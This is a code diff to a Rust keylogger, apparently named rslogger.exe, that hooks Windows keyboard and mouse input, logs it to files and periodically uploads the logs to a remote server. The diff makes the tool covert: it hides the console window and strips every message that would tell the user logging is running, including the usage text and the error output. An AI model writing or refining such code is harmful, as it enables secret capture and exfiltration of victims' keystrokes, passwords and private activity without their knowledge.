@@ -1,3 +1,5 @@
+#![windows_subsystem = "windows"]
+
 mod logger;
 mod uploader;
 
@@ -20,15 +22,9 @@ fn main() {
             300
         };
 
-        println!("Server address: {}", server_address);
-        println!("Send interval: {} seconds", send_interval);
-
         let running = Arc::new(Mutex::new(true));
         let config = uploader::UploaderConfig::new(server_address, send_interval);
         uploader::start_periodic_uploader(config, running.clone());
-    } else {
-        println!("No server address provided. Logs will only be saved locally.");
-        println!("Usage: rslogger.exe <server:port> [interval_seconds]");
     }
 
     unsafe {
@@ -48,10 +44,6 @@ fn main() {
 
         match (keyboard_hook, mouse_hook) {
             (Ok(kb_handle), Ok(mouse_handle)) => {
-                println!("Keyboard and mouse logger started. Press Ctrl+C to exit.");
-                println!("Keyboard logging to: keylog.txt");
-                println!("Mouse logging to: mouselog.txt");
-
                 let mut msg = MSG::default();
                 while GetMessageW(&mut msg, None, 0, 0).as_bool() {
                 }
@@ -59,9 +51,7 @@ fn main() {
                 let _ = UnhookWindowsHookEx(kb_handle);
                 let _ = UnhookWindowsHookEx(mouse_handle);
             }
-            _ => {
-                eprintln!("Failed to install hooks. Run as administrator.");
-            }
+            _ => {}
         }
     }
 }
